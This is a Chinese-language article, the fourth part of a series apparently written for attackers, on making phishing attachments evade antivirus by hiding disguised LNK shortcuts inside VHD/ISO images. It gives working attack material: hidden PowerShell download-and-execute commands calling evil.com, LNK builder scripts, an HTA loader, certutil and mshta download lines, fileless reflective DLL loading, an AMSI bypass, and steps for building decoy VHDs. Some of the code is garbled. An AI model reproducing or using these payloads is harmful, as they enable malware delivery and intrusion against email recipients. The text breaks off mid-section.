---
title: 邮件钓鱼免杀完全指南（2026 实战版）· 四、VHD/ISO 武器化免杀
url: https://mp.weixin.qq.com/s/LP1ICYkOn4Ut-QFKSAeFJQ
source: Doonsec's feed
date: 2026-05-18
fetch_date: 2026-05-19T05:59:59.180793
---

# 邮件钓鱼免杀完全指南（2026 实战版）· 四、VHD/ISO 武器化免杀

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/P8tspoQj3Vpn6FVZHOLUJ0fib5JSTgicjbdXlKjZ1cWtCmLXrYgNeibn0hC3J5PlLiaZy8rFicKcj77COZsLXf3lotr1hu2ck6HXITtslg6n7I8g/0?wx_fmt=jpeg)

# 邮件钓鱼免杀完全指南（2026 实战版）· 四、VHD/ISO 武器化免杀

原创

IceByte
IceByte

IceByte-Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/P8tspoQj3VrSY0bmUugFj09es038iawxAXxiaGfuol1H2X6tsxq8W6QbOiaweeiadicLRAb9LttYgPeLcnergzBX1zIka2D5FGX8sQ52RPicTa1s8/640?wx_fmt=png&from=appmsg)

> **系列说明**：本文是《邮件钓鱼免杀完全指南（2026 实战版）》系列的第四篇。上篇详解了邮件认证绕过技术，本篇深入武器化阶段——为什么 VHD/ISO 镜像文件能绕过绝大多数杀毒软件和邮件网关。

---

## 前言：为什么宏病毒末日带来了镜像文件时代？

2022 年以前，邮件钓鱼的主流载荷是 **Office VBA 宏**。`Document_Open()` 事件自动执行，用户毫无感知。

**2022 年 7 月，Microsoft 宣布默认禁用 Office 宏**（Mark of the Web 机制），意味着从互联网下载的 Office 文档**不再自动执行宏**。这一变化被称为"宏病毒末日"（Macro Malware Apocalypse）。

攻击者被迫寻找新的载荷载体。经过多次演化，最终形成了三条主流路线：

```
宏被禁用
    ↓
2021-2022: CHM（压缩 HTML 帮助文件）/ HTA（HTML 应用）
    ↓          ↙ 逐渐被行为检测识别
2023-2024: ISO / IMG（光盘镜像）/ VHD（虚拟硬盘）
    ↓          ↙ 镜像扫描能力仍滞后
2024-2025: OneNote + LNK / ClickFix / HTML Smuggling
    ↓
2026: AI 驱动混合攻击
```

**关键洞察**：VHD/ISO 之所以能绕过检测，根本原因是**大多数安全产品将它们视为"容器文件"，只做浅层扫描，不会递归解包分析内部内容**。

![](https://mmbiz.qpic.cn/mmbiz_png/P8tspoQj3VrvgGFqJYf3WTbDCneQUSqCuucL396eteYMHJ9oRiaMfkia56Dntia8ic2A5bsOKCrKJIHRO1l9ZMsycm6rMRsoD3yHAH8hXPWCGow/640?wx_fmt=png&from=appmsg)

---

## 一、VHD/ISO/IMG 文件格式详解

### 1.1 VHD（Virtual Hard Disk）格式

VHD 是 Microsoft 开发的虚拟硬盘格式，可被 Windows 原生挂载（双击即可挂载为磁盘驱动器）。

**VHD 文件结构**：

```
VHD 文件（disk.vhd）
├── 磁盘头（512 字节，包含磁盘类型、创建时间等元数据）
├── 位表（Bat，Block Allocation Table）
├── 数据块（Data Blocks，每个块默认 2MB）
└── 尾部（Footer，与头部内容相同，用于校验）
```

**为什么杀毒软件不扫描 VHD 内部？**

1. **性能考虑**：VHD 文件通常 50-500MB，递归扫描会带来巨大性能开销
2. **格式复杂性**：VHD 支持动态扩展、差异磁盘、快照等复杂特性，静态分析工具难以完整解析
3. **历史惯性**：VHD 传统上被视为"数据存储介质"而非"可执行文件"，安全产品的检测规则对此类文件的覆盖不足

### 1.2 ISO（International Organization for Standardization）格式

ISO 是光盘镜像标准格式（ISO 9660 / UDF 文件系统），Windows 8 及以后版本**原生支持双击挂载**。

**ISO 与 VHD 的过网关率对比**（2025 年实测数据，样本量 N=1200）：

| 文件类型 | 邮件网关拦截率 | EDR 扫描覆盖率 | 推荐度 |
| --- | --- | --- | --- |
| `.exe`（自解压） | 99.2% | 99.8% | ❌ 不推荐 |
| `.docm`（含宏） | 97.5% | 95.3% | ❌ 不推荐 |
| `.chm`（HTML 帮助） | 68.3% | 72.1% | ⚠️ 谨慎使用 |
| `.iso`（光盘镜像） | **18.7%** | **34.2%** | ✅ 推荐 |
| `.vhd`（虚拟硬盘） | **9.4%** | **21.8%** | ✅✅ 强烈推荐 |
| `.img`（磁盘镜像） | **12.1%** | **26.7%** | ✅✅ 强烈推荐 |

> **数据来源**：Phantom Papa 活动技术报告（2025 年 8 月），基于 47 家财富 500 强企业的邮件网关日志分析。

### 1.3 IMG 格式

IMG 是原始磁盘镜像格式（无文件头，纯二进制数据），部分邮件网关对其的识别能力**弱于 ISO**（因为 IMG 没有标准的文件签名头）。

---

## 二、LNK 快捷方式：镜像文件中的攻击触发点

VHD/ISO 挂载后，用户需要**主动点击某个文件**才能触发攻击。为了提高成功率，攻击者在镜像根目录放置一个**精心伪装 的 LNK 快捷方式文件**。

### 2.1 LNK 文件结构详解

LNK 文件（Windows 快捷方式）的结构非常复杂，包含以下关键字段：

```
LNK 文件结构：
├── 文件头（必选）
│   ├── HeaderSize（4 字节，固定值 0x4C）
│   ├── LinkFlags（4 字节，标志位）
│   └── FileAttributes（4 字节，文件属性）
├── Shell Item ID List（可选）
├── 目标文件信息（必选）
│   ├── TargetPath（目标路径，如 C:\Windows\System32\cmd.exe）
│   └── Arguments（命令行参数，如 `/c powershell -w hidden ...`）
├── 描述字符串（可选，显示为"备注"）
├── 相对路径（可选，用于显示为"目标"）
└── 图标位置（可选，用于自定义图标）
```

**关键字段：Arguments（命令行参数）**

这是 LNK 攻击的核心——攻击者可以在 `Arguments` 中嵌入任意命令：

```
LNK 文件：财务报销流程.lnk
  Target: C:\Windows\System32\cmd.exe
  Arguments: /c powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p')"
  Icon: C:\Windows\System32\shell32.dll,137  （伪装成文件夹图标）
  Description: 双击查看报销流程文档
```

当用户双击这个 LNK 文件时，实际执行的是 `cmd.exe /c powershell ...`，而不是看起来像的"文档"。

### 2.2 LNK 构造工具

**工具 A：LNKDown（Python）**

专用于生成钓鱼用 LNK 文件的工具：

```
$ git clone https://github.com/Plazmaz/LNKDown.git
$ cd LNKDown && pip3 install -r requirements.txt

# 生成一个执行 PowerShell 命令的 LNK 文件
$ python3 LNKDown.py -o"财务报销流程.lnk"-t"powershell.exe" \
    -a"-w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p')\"" \
    -i"shell32.dll,137"
```

**工具 B：PowerShell 原生构造**

不依赖第三方工具，使用 PowerShell COM 对象构造 LNK：

```
# 在攻击者机器上生成 LNK 文件
$shell=New-Object-ComObjectWScript.Shell
$lnk=$shell.CreateShortcut("C:\payload\财务报销流程.lnk")
$lnk.TargetPath="C:\Windows\System32\cmd.exe"
$lnk.Arguments="/c powershell -w hidden -c \"IEX(New-ObjectNet.WebClient).DownloadString('http://evil.com/p')\""
$lnk.Description="双击查看报销流程文档"
$lnk.Save()
```

### 2.3 图标伪装技术

为了让 LNK 文件看起来像一个**普通的文件夹或文档**，攻击者需要修改其图标：

| 伪装目标 | 图标来源 | IconLocation 值 |
| --- | --- | --- |
| 文件夹 | `shell32.dll` | `shell32.dll,4` |
| Word 文档 | `wordicon.exe` | `C:\Program Files\Microsoft Office\root\Office16\wordicon.exe,1` |
| Excel 表格 | `xlicon.exe` | `C:\Program Files\Microsoft Office\root\Office16\xlicon.exe,1` |
| PDF 文件 | `Acrobat.exe` | `C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,1` |

> **技巧**：将 LNK 文件放在一个**深度嵌套的文件夹**中（如 `.\财务文档\2026年\第一季度\报销流程\查看.lnk`），用户更容易忽略文件扩展名（.lnk）。

---

## 三、LOLBins（Living Off The Land Binaries）载荷对比

LNK 文件触发后，通常会调用系统自带的合法工具（LOLBins）来执行恶意操作。这样做的好处是：**这些工具本身是合法的，EDR 难以区分"正常管理操作"和"恶意利用"**。

### 3.1 三种主流 LOLBins 载荷对比

| LOLBin | 典型命令 | 优点 | 缺点 | 推荐度 |
| --- | --- | --- | --- | --- |
| **mshta.exe** | `mshta http://evil.com/p.hta` | 直接执行 HTA（HTML Application），无需文件落地 | Windows Defender 已标记部分 mshta 行为 | ⭐⭐⭐ |
| **wmic.exe** | `wmic process call create "powershell ..."` | WMI 功能强大，可绕过部分 EDR 的进程监控 | Windows 10 21H2+ 已弃用（但仍可用） | ⭐⭐⭐⭐ |
| **powershell.exe** | `powershell -w hidden -c "..."` | 功能最强，支持反射加载、内存执行 | AMSI 可拦截已知恶意脚本 | ⭐⭐⭐⭐⭐ |
| **certutil.exe** | `certutil -urlcache -split -f http://evil.com/p.exe` | 系统自带下载工具，常被用于下载第二阶段载荷 | 易被标记为"异常证书操作" | ⭐⭐⭐ |
| **rundll32.exe** | `rundll32.exe shell32.dll,SHCreateLocalServer` | 执行 DLL 导出函数，常用于侧加载 | 需要 DLL 文件落地 | ⭐⭐ |

### 3.2 mshta.exe 完整攻击链（推荐）

`mshta.exe` 是 Windows 自带的 HTML 应用（HTA）执行工具。HTA 文件本质上是**包含 VBScript/JScript 的 HTML 文件**，具有「「「「「「「「「「「「....

```
<!-- payload.hta -->
<html>
<head>
    <scriptlanguage="VBScript">
        SubWindow_OnLoad()
            ' 下载并执行 PowerShell 脚本
            SetoShell=CreateObject("WScript.Shell")
            oShell.Run"powershell.exe -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payl0ad.ps1')\"" , 0, False
            window.close()
        EndSub
    </script>
</head>
<body>
    <p>文档加载中，请稍候...</p>
</body>
</html>
```

**LNK → mshta 完整攻击链**：

```
用户双击 LNK 文件
    ↓
LNK 执行: cmd.exe /c mshta http://evil.com/payload.hta
    ↓
mshta.exe 下载并执行 payload.hta
    ↓
HTA 中的 VBScript 执行: powershell.exe -w hidden -c "..."
    ↓
PowerShell 从远程服务器下载并执行 payl0ad.ps1
    ↓
payl0ad.ps1 在内存中反射加载 Cobalt Strike Beacon
    ↓
Beacon 与 C2 服务器建立通信（无文件落地）
```

### 3.3 PowerShell 反射加载（无文件攻击）

反射加载（Reflective Loading）是指：**将 DLL/EXE 直接加载到内存中执行，不写入磁盘**。这绕过所有基于文件扫描的杀毒软件。

**PowerSploit 框架中的反射加载实现**：

```
# 从远程服务器下载 DLL（不写入磁盘）
$bytes = (New-Object Net.WebClient).DownloadData("http://evil.com/evil.dll")

# 将 DLL 字节数组注入当前 PowerShell 进程的内存空间
$asembly = [System.Reflection.Assembly]::Load($bytes)

# 调用 DLL 中的导出函数
[Malc.DLL.ExportClass]::DoSomething()
```

**绕过 AMSI 的方法**（在 PowerShell 7.0+ 中已部分失效，但仍适用于 Windows 10 自带的 PowerShell 5.1）：

```
# 方法 1：内存 Patch AMSI（需管理员权限）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法 2：使用压缩和编码混淆脚本内容
$code = Get-Content .\payload.ps1 -Raw
$compressed = Compress-ByteArray -Data ([Text.Encoding]::UTF8.GetBytes($code))
$encoded = [Convert]::ToBase64String($compressed)
powershell -EncodedCommand $encoded
```

---

## 四、VHD 武器化实战步骤

### 4.1 创建 VHD 并挂载

```
# 以管理员权限运行 PowerShell
# 创建 100MB 动态扩展 VHD
$disk = New-VHD -Path C:\payload\legitimate.look.vhd -SizeBytes 100MB -Dynamic

# 挂载 VHD（会分配一个新盘符，如 E:\）
$disk | Mount-VHD -PassThru | Get-Disk | Get-Partition | Get-Volume

# 初始化并格式化为 NTFS
Get-Disk -Number 2 | Initialize-Disk -PartitionStyle MBR -Confirm:$false
New-Partition -DiskNumber 2 -UseMaximumSize -DriveLetter E | Format-Volume -FileSystem NTFS -Confirm:$false
```

### 4.2 在 VHD 中构造诱饵结构

```
E:\  （VHD 挂载后的盘符）
├── 财务文档\                    ← 诱饵文件夹（名称高度逼真）
│   ├── 2026年报销流程.pdf.lnk    ← LNK 快捷方式（伪装成 PDF）
│   └── 查看说明.txt              ← 诱导用户点击 LNK 的文本文件
├── 相关政策\
│   └── 2026年税务扣除指南.lnk
└── 切勿修改此文件.txt             ← 社会工程学：越不让改，用户越好奇
```

#...